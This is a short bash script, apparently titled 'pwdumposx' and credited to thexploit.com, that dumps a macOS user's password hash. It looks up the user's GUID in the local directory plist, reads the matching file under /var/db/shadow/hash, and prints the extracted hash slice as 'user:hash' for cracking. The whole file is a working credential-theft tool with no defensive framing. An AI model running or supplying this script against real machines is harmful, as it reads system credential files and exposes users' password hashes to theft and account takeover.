#!/bin/bash
# pwdumposx - thexploit.com
USER=lwy08
cmd="/usr/bin/xpath"
path="/var/db/dslocal/nodes/Default/users/$USER.plist"
args="//key[contains(text(),'generateduid')]/following::array/string/text()"
guid=$($cmd $path $args 2>/dev/null | cut -c1-36)
cat "/var/db/shadow/hash/$guid" | cut -c169-216 | sed -e "s/^/$USER:/g"
